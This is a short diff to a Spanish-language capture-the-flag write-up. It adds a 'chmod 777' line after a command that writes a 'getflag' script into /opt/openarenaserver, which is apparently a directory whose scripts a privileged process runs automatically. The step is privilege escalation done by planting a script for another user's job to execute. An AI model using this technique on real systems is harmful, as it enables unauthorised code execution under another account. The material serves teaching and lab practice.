@@ -88,7 +88,7 @@ Creamos un script malicioso diseñado para ejecutar `getflag` y redirigir la sal
 
 ```bash
 echo "getflag > /tmp/token" > /opt/openarenaserver/break.sh
-
+chmod 777 /opt/openarenaserver/break.sh
 ```
 
 ### Paso 3: Ejecución Automática
